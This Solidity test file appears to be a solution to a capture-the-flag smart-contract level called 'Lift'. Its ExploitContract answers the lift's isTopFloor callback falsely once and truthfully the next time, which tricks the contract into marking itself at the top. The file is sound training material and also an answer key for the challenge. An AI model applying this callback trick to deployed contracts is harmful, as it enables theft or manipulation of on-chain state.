// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        ExploitContract exploit = new ExploitContract();
        exploit.goToFloor(0, instance);
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}


contract ExploitContract is House {
    bool public flag = false;

    function isTopFloor(uint256) external override returns (bool) {
        if (!flag) {
            flag = true;
            return false;
        }
        return true;
    }

    function goToFloor(uint256 _floor, Lift _lift) public {
        _lift.goToFloor(_floor);
    }
}